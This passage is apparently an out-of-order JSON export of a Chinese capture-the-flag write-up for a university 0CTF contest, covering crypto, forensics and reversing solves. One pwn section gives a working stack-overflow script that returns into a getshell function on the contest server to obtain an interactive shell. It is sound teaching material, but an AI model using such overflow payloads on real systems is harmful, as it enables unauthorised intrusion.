class=\"line\">    <span class=\"keyword\">return</span> bytearray(md5(s).digest())</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">xor</span><span class=\"params\">(a, b)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> len(a) == len(b)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> bytearray([ i ^ j <span class=\"keyword\">for</span> i, j <span class=\"keyword\">in</span> zip(a, b) ])</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">flag = bytearray(raw_input(<span class=\"string\">'Show me your flag: '</span>))</span><br><span class=\"line\"><span class=\"keyword\">assert</span> len(flag) == <span class=\"number\">32</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>):</span><br><span class=\"line\">    flag[:<span class=\"number\">16</span>] = xor(flag[:<span class=\"number\">16</span>], md5raw(flag[<span class=\"number\">16</span>:]))</span><br><span class=\"line\">    flag[:<span class=\"number\">16</span>], flag[<span class=\"number\">16</span>:] = flag[<span class=\"number\">16</span>:], flag[:<span class=\"number\">16</span>]</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> flag == <span class=\"string\">'\\xa5\\xc6\\xe6\\xeca\\x0c:ED\\xed#\\x19\\x94LF\\x11\\x17\\xc4.\\xeb\\xa1\\xc2|\\xc1&lt;\\xa9\\\\A\\xde\\xd22\\n'</span>:</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'Right!'</span></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'Wrong!'</span></span><br></pre></td></tr></table></figure>\n<p>这个看代码是典型的Feistel加密，Feistel结构如下，每轮涉及异或与互换，解密就是把过程逆回去。</p>\n<p><img src=\"/images/in-post/post-blog-jserv11.png\" alt=\"img\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> md5</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5raw</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> bytearray(md5(s).digest())  </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">xor</span><span class=\"params\">(a, b)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> len(a) == len(b)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> bytearray([ i ^ j <span class=\"keyword\">for</span> i, j <span class=\"keyword\">in</span> zip(a, b) ])</span><br><span class=\"line\">flag = bytearray(<span class=\"string\">'\\xa5\\xc6\\xe6\\xeca\\x0c:ED\\xed#\\x19\\x94LF\\x11\\x17\\xc4.\\xeb\\xa1\\xc2|\\xc1&lt;\\xa9\\\\A\\xde\\xd22\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>):</span><br><span class=\"line\">    flag[<span class=\"number\">16</span>:] = xor(flag[<span class=\"number\">16</span>:], md5raw(flag[:<span class=\"number\">16</span>]))</span><br><span class=\"line\">    flag[:<span class=\"number\">16</span>], flag[<span class=\"number\">16</span>:] = flag[<span class=\"number\">16</span>:], flag[:<span class=\"number\">16</span>]</span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\"></span><br><span class=\"line\">print(flag)</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;flag&#123;<span class=\"number\">1</span>nt3re5tiNg_F3iste1_ciPh3R&#125;</span><br></pre></td></tr></table></figure>\n<p></p><p id=\"j9\"></p><p></p>\n<h3 id=\"9-encoder-200\"><a href=\"#9-encoder-200\" class=\"headerlink\" title=\"9.encoder 200\"></a>9.encoder 200</h3><p>逆向题目，链接为[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/encoder.zip\" target=\"_blank\" rel=\"noopener\">encoder.zip</a>]，解压后一个名为encoder的可执行文件，一个加密后的flag”KNByeN88KqslM52E1L67aYREK1qQ2N1QydYlaEd=”。执行encoder，发现就是一个加密算法，输入明文，返回密文。那么解题思路就是找到上述密文对应的明文就是flag。</p>\n<p><img src=\"/images/in-post/post-blog-jserv12.png\" alt=\"img\"></p>\n<p>使用IDA打开encoder进行分析。<code>main</code>函数如下，主要调用了<code>sub_4006D6()</code>这个函数</p>\n<p><img src=\"/images/in-post/post-blog-jserv13.png\" alt=\"img\"></p>\n<p>函数<code>sub_4006D6()</code>内容如下，是主要的加密过程</p>\n<p><img src=\"/images/in-post/post-blog-jserv14.png\" alt=\"img\"></p>\n<p>在函数<code>sub_4006D6()</code>内使用了两个数组（上图红线部分），数组内容如下。注意<code>byte_601080[]</code>第一位为<code>61h</code>是字符a，所以数组内容为<code>&#39;afe7WlyVd12XKLhnqvzQb5B6sNR8gYME&#39;</code>，解题过程中就遇到了所给密文中有a，而找不到a在哪里的尴尬局面。</p>\n<p><img src=\"/images/in-post/post-blog-jserv15.png\" alt=\"img\"></p>\n<p>反编译出的c代码的问题是变量名不易于理解，需要先来理解<code>sub_4006D6()</code>的主要过程。main函数中变量<code>s</code>为输入字符串的地址，变量<code>v6</code>为字符串的长度。于是可以得到<code>shb_4006D6()</code>函数中变量<code>a1</code>为字符串起始地址，<code>a2</code>为字符串长度。接下来<code>malloc()</code>函数分配空间，应该是给密文分配空间的，从<code>8*(len/5+1)+1</code>可以看出算法是分组加密，每5个字符加密出8个字符。<code>v7</code>是将输入字符的一个分组取出来，重点在到<code>v9[] = byte_601080[v7 &amp; 0x1F]</code>也就是取<code>v7</code>的后5位去<code>byte_601080[]</code>中查询一个字符出来反向放置作为加密结果。对于不满足5位的情况在，算法会在后面补上“=”。下面给出一个修改过变量名的版本，易于理解。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_BYTE *__<span class=\"function\">fastcall <span class=\"title\">sub_4006D6</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> __int64 messagePtr, <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> len)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [sp+14h] [bp-2Ch]@4</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> j; <span class=\"comment\">// [sp+14h] [bp-2Ch]@9</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> left_len; <span class=\"comment\">// [sp+18h] [bp-28h]@2</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v6; <span class=\"comment\">// [sp+1Ch] [bp-24h]@9</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 check_sum; <span class=\"comment\">// [sp+20h] [bp-20h]@2</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 new_message_ptr; <span class=\"comment\">// [sp+28h] [bp-18h]@1</span></span><br><span class=\"line\">  _BYTE *group_secret; <span class=\"comment\">// [sp+30h] [bp-10h]@1</span></span><br><span class=\"line\">  _BYTE *secret; <span class=\"comment\">// [sp+38h] [bp-8h]@1</span></span><br><span class=\"line\"></span><br><span class=\"line\">  secret = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span> * (len / <span class=\"number\">5</span> + <span class=\"number\">1</span>) + <span class=\"number\">1</span>);</span><br><span class=\"line\">  new_message_ptr = messagePtr;</span><br><span class=\"line\">  group_secret = secret;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( len + messagePtr &gt; new_message_ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    check_sum = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">    left_len = len + messagePtr - new_message_ptr;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( left_len &gt; <span class=\"number\">5</span> )</span><br><span class=\"line\">      left_len = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">4</span>; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      check_sum &lt;&lt;= <span class=\"number\">8</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( i &lt; left_len )</span><br><span class=\"line\">        check_sum |= *(_BYTE *)(i + new_message_ptr);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v6 = dword_6010B0[left_len - <span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( j = <span class=\"number\">7</span>; j &gt;= <span class=\"number\">0</span>; --j )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      group_secret[j] = byte_601080[check_sum &amp; <span class=\"number\">0x1F</span>];</span><br><span class=\"line\">      check_sum &gt;&gt;= <span class=\"number\">5</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v6 )</span><br><span class=\"line\">      <span class=\"built_in\">memset</span>(&amp;group_secret[<span class=\"number\">8L</span>L - v6], <span class=\"number\">61</span>, v6);</span><br><span class=\"line\">    new_message_ptr += <span class=\"number\">5L</span>L;</span><br><span class=\"line\">    group_secret += <span class=\"number\">8</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *group_secret = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> secret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那么解密过程就是，对于密文的每8个字符的分组，去<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">```python</span><br><span class=\"line\">def decode(secret):</span><br><span class=\"line\">    table = &apos;afe7WlyVd12XKLhnqvzQb5B6sNR8gYME&apos;</span><br><span class=\"line\">    message = [0]*40</span><br><span class=\"line\">    string = [&apos;&apos;]*5</span><br><span class=\"line\"></span><br><span class=\"line\">    for i, ch in enumerate(secret):</span><br><span class=\"line\">        index = table.index(ch)</span><br><span class=\"line\">        print(index)</span><br><span class=\"line\">        start = (8-i)*5-5</span><br><span class=\"line\">        while index!=0:</span><br><span class=\"line\">            message[start] = index % 2</span><br><span class=\"line\">            #print (message,start,index)</span><br><span class=\"line\">            index &gt;&gt;= 1</span><br><span class=\"line\">            start += 1</span><br><span class=\"line\"></span><br><span class=\"line\">    for i in range(5):</span><br><span class=\"line\">        num = 0</span><br><span class=\"line\">        for j in range(i*8+7, i*8-1, -1):</span><br><span class=\"line\">            num &lt;&lt;= 1</span><br><span class=\"line\">            num += message[j]</span><br><span class=\"line\">        string[i] = chr(num)</span><br><span class=\"line\">    print(string)</span><br><span class=\"line\">    return string[::-1]</span><br><span class=\"line\"></span><br><span class=\"line\">print(&quot;&quot;.join(decode(&quot;KNByeN88&quot;)+decode(&quot;KqslM52E&quot;)+decode(&quot;1L67aYRE&quot;)+decode(&quot;K1qQ2N1Q&quot;)+decode(&quot;ydYlaEd&quot;)))</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;flag&#123;d0_U_Kn0w_ba5e32:P&#125;</span><br></pre></td></tr></table></figure></p>\n<p>最终flag提示do u know base32，其实最开始看到密文结尾为=就尝试用了base64</p>\n<p></p><p id=\"j10\"></p><p></p>\n<h3 id=\"10-seabreeze’s-stack-100\"><a href=\"#10-seabreeze’s-stack-100\" class=\"headerlink\" title=\"10.seabreeze’s stack 100\"></a>10.seabreeze’s stack 100</h3><p>题目内容为“nc 202.121.178.181 12321”与一个下载链接[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/stack\" target=\"_blank\" rel=\"noopener\">stack_55a49bdfcdafd0c31657649e905486a4</a>]，得到一个名为stack的二进制文件。使用strings指令查看一下内部字符内容</p>\n<p><img src=\"/images/in-post/post-blog-jserv16.png\" alt=\"img\"></p>\n<p>可以看到Shell Gotten与三个问题。执行nc指令</p>\n<p><img src=\"/images/in-post/post-blog-jserv17.png\" alt=\"img\"></p>\n<p>需要回答的问题与文件中的内容一致，但是之后还需要输入内容。根据上文的Sell Gotten，显然这里我们需要得到shell的控制权，再根据题目名字stack，考虑为栈溢出问题。</p>\n<p>使用IDA-win32打开，main函数的主体是work函数，work函数如下，就是之前要回答的三个问题。</p>\n<p><img src=\"/images/in-post/post-blog-jserv18.png\" alt=\"img\"></p>\n<p>还有一个没有用到的函数getshell()</p>\n<p><img src=\"/images/in-post/post-blog-jserv19.png\" alt=\"img\"></p>\n<p>只需要程序的返回地址为getshell()的地址，就会触发执行了。查询得到getshell的起始地址为0804 85cb</p>\n<p><img src=\"/images/in-post/post-blog-jserv20.png\" alt=\"img\"></p>\n<p>栈溢出的原理可以参考链接[<a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stackoverflow_basic.html\" target=\"_blank\" rel=\"noopener\">栈溢出</a>]</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> zio <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">io = zio((<span class=\"string\">'202.121.178.181'</span>, <span class=\"number\">12321</span> ))</span><br><span class=\"line\">io.read_until(<span class=\"string\">'Do you want to get acquainted with top experts and like-minded friends in computer security?'</span>)  </span><br><span class=\"line\">io.writeline(<span class=\"string\">'Yes!'</span>)  </span><br><span class=\"line\">io.read_until(<span class=\"string\">'Do you want to stride forwards on the road of hacking and explore endless possibilities?'</span>)  </span><br><span class=\"line\">io.writeline(<span class=\"string\">'Yes!!'</span>)</span><br><span class=\"line\">io.read_until(<span class=\"string\">'Do you want to challenge world cutting-edge technology and compete with outstanding hackers?'</span>)</span><br><span class=\"line\">io.writeline(<span class=\"string\">'Yes!!!'</span>)</span><br><span class=\"line\">success_addr = <span class=\"number\">0x080485cb</span></span><br><span class=\"line\">payload = <span class=\"string\">'a'</span> * <span class=\"number\">0x3fc</span> + <span class=\"string\">\"bbbb\"</span> + p32(success_addr)</span><br><span class=\"line\">io.writeline(payload)  </span><br><span class=\"line\">io.interact()</span><br></pre></td></tr></table></figure>\n<p>运行代码<br><img src=\"/images/in-post/post-blog-jserv21.png\" alt=\"img\"></p>\n<p>cd 进入 /home/…/stack 目录，cat 显示flag。<br><img src=\"/images/in-post/post-blog-jserv22.png\" alt=\"img\"></p>\n<h2 id=\"Have-Idea\"><a href=\"#Have-Idea\" class=\"headerlink\" title=\"Have Idea\"></a>Have Idea</h2><p></p><p id=\"j11\"></p><p></p>\n<h3 id=\"11-aes-duet\"><a href=\"#11-aes-duet\" class=\"headerlink\" title=\"11.aes-duet\"></a>11.aes-duet</h3><p>题目描述为一个链接[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/aes_duet.zip\" target=\"_blank\" rel=\"noopener\">aes_duet.zip</a>]，解压得到一个密文和加密函数，文件如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dummy_key_extend</span><span class=\"params\">(k)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> len(k) == <span class=\"number\">4</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> k * <span class=\"number\">4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">aes_duet</span><span class=\"params\">(plain, key)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># It is so safe that I use AES twice here!</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> len(key) == <span class=\"number\">8</span></span><br><span class=\"line\">    k1 = dummy_key_extend(key[:<span class=\"number\">4</span>])</span><br><span class=\"line\">    k2 = dummy_key_extend(key[<span class=\"number\">4</span>:])</span><br><span class=\"line\">    c1 = AES.new(k1, AES.MODE_ECB)</span><br><span class=\"line\">    c2 = AES.new(k2, AES.MODE_ECB)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> c2.encrypt(c1.encrypt(plain))</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">'./secretkey'</span>, <span class=\"string\">'rb'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        key = f.read()</span><br><span class=\"line\">    <span class=\"comment\"># To make life easier...</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (key.encode(<span class=\"string\">'hex'</span>))[<span class=\"number\">0</span>] == <span class=\"string\">'0'</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (key.encode(<span class=\"string\">'hex'</span>))[<span class=\"number\">-1</span>] == <span class=\"string\">'8'</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    plain = <span class=\"string\">'I am a piece of lovely plaintext'</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">'ciphertext'</span>, <span class=\"string\">'wb'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        f.write(aes_duet(plain, key))</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"I am a lovely flag: flag&#123; %s&#125;\"</span> % key.encode(<span class=\"string\">'hex'</span>)</span><br></pre></td></tr></table></figure>\n<p>思路很简单，就是AES两轮加密的中间相遇攻击，虽然题目为了降低复杂性提示了key的第一位为0最后一位为8，但是计算量还是十分庞大，需要很多内存，而且计算出来中间值后，查询也会耗时，加上心里的“B树”和“B+树”早忘的没影了，最终因为时间与硬件原因放弃。</p>\n<h2 id=\"感想\"><a href=\"#感想\" class=\"headerlink\" title=\"感想\"></a>感想</h2><p>程序的安全性与正确性同等重要。</p>\n<p>我们在众多bug中微妙的生活着。</p>\n<p>PHP是世界上最好的语言。</p>\n<p><img src=\"/images/in-post/post-blog-j0serv8.gif\" alt=\"img\"></p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“flag{php_is_best_language_:P}”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>SJTU 0ops 举办的0CTF校内交流赛，12月9号到10号。部分题目索引如下（文中涉及的文件下载[<a href=\"/docs/in-post/Junior0ctfQuestion.zip\">链接</a>]</p>\n<p><a href=\"#j0\">QQ Group </a>|<a href=\"#j1\">Mystery Numbers </a>|<a href=\"#j2\">Easy Traffic Analyze </a>|<a href=\"#j3\">AES-server</a><br><a href=\"#j4\">babyrsa </a>|<a href=\"#j5\">Shatter Sha512!</a>|<a href=\"#j6\">Penetrate In </a>|<a href=\"#j7\">Eva</a><br><a href=\"#j8\">babyre</a>|<a href=\"#j9\">encoder </a>|<a href=\"#j10\">seabreeze’s stack </a>|<a href=\"#j11\">aes-duet </a></p>\n<h2 id=\"Solved\"><a href=\"#Solved\" class=\"headerlink\" title=\"Solved\"></a>Solved</h2><p></p><p id=\"j0\"></p><p></p>\n<h3 id=\"0-QQ-Group-50\"><a href=\"#0-QQ-Group-50\" class=\"headerlink\" title=\"0.QQ Group 50\"></a>0.QQ Group 50</h3><p>友情送分题，加入QQ交流群送一个flag。</p>\n<p></p><p id=\"j1\"></p><p></p>\n<h3 id=\"1-Mystery-Numbers-100\"><a href=\"#1-Mystery-Numbers-100\" class=\"headerlink\" title=\"1.Mystery Numbers 100\"></a>1.Mystery Numbers 100</h3><p>题目描述没有什么实质性内容。给了一个link[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/signal.txt\" target=\"_blank\" rel=\"noopener\">numbers_f300d7d6dce847a265407e072790370d</a>]，下载得到一个文本文件，内容如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5a6d78685a33746b4d4639354d48566661323477643139694e44557a4e6a52666144526f4e4638324e44593058336b3065545239</span><br></pre></td></tr></table></figure>\n<p>因为看到全是字母与数字的排列，而且范围是0到f，应该是一串16进制的编码，以16进制解码到ascii，得到如下内容</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9</span><br></pre></td></tr></table></figure>\n<p>应该还是一串被加密的字符，观察密文形式，很像base64，尝试用它来解码，得到flag。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">s = <span class=\"string\">'ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9'</span></span><br><span class=\"line\">a = base64.b64decode(s)</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;flag&#123;d0_y0u_kn0w_b45364_h4h4_6464_y4y4&#125;</span><br></pre></td></tr></table></figure>\n<p></p><p id=\"j2\"></p><p></p>\n<h3 id=\"2-Easy-Traffic-Analyze-200\"><a href=\"#2-Easy-Traffic-Analyze-200\" class=\"headerlink\" title=\"2.Easy Traffic Analyze 200\"></a>2.Easy Traffic Analyze 200</h3><p>题目给了一个link[<a href=\"https://ctf.0ops.sjtu.cn/upload/flag.pcap\" target=\"_blank\" rel=\"noopener\">flag.pcap</a>]，是一个通信包文件，但是用wireshark打开提示格式不正确，应该是pcap文件受损。需要先修复pcap，可以使用[<a href=\"https://f00l.de/pcapfix/\" target=\"_blank\" rel=\"noopener\">pcapfix</a>]软件来修复。</p>\n<p>之后使用wireshark打开，通信包有很多，过滤一下http请求，发现只有3个</p>\n<p><img src=\"/images/in-post/post-blog-jserv8.png\" alt=\"img\"></p>\n<p>选择“文件” -&gt; “导出对象” -&gt; “HTTP”将其导出，得到三个文件。</p>\n<p><img src=\"/images/in-post/post-blog-jserv0.png\" alt=\"img\"></p>\n<p>其中upload.php很大，有1.9M，以二进制打开，发现文件里有flag1.png，同时有一个zip文件标志头信息504B 0304。</p>\n<p><img src=\"/images/in-post/post-blog-j0serv1.png\" alt=\"img\"></p>\n<p>将前面不重要的部分删去，得到的文件更改后缀名为zip解压，得到一张图（还挺好看的 (●ﾟωﾟ●)。</p>\n<p><img src=\"/images/in-post/post-blog-jserv2.png\" alt=\"img\"></p>\n<p>这里一般的套路是会在图片里隐写信息，将图片以二进制打开，因为文件比较大，在中间寻找flag较困难，考虑到简单的隐写一般在文件结尾处，直接去文件尾查询，得到了flag。</p>\n<p><img src=\"/images/in-post/post-blog-jserv3.png\" alt=\"img\"></p>\n<p></p><p id=\"j3\"></p><p></p>\n<h3 id=\"3-AES-server-100\"><a href=\"#3-AES-server-100\" class=\"headerlink\" title=\"3.AES-server 100\"></a>3.AES-server 100</h3><p>题目给出“nc 202.121.178.199 9999” 与一个文件[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/server.py\" target=\"_blank\" rel=\"noopener\">server.py</a>]，其中nc是linux的netcat指令，具体介绍可以自己搜索，在此题中不是重点部分。server.py文件内容如下，也即是服务器上的代码。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span>!/usr/bin/env python</span><br><span class=\"line\"><span class=\"meta\">#</span> coding=utf-8</span><br><span class=\"line\"></span><br><span class=\"line\">import SocketServer</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"></span><br><span class=\"line\">with open('secretkey', 'rb') as f:</span><br><span class=\"line\">    key = f.read()</span><br><span class=\"line\">with open('flag.txt') as f:</span><br><span class=\"line\">    flag = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\">class handler(SocketServer.BaseRequestHandler):</span><br><span class=\"line\"></span><br><span class=\"line\">    def handle(self):</span><br><span class=\"line\">        self.request.send(\"Welcome to the perfect aes-cbc cryptosystem!(decrypt-only)\\n\")</span><br><span class=\"line\">        self.request.send(\"Please input your iv and encrypted message in hex:\\n\")</span><br><span class=\"line\">        </span><br><span class=\"line\">        data = self.request.recv(1024).rstrip()</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            raw_data = 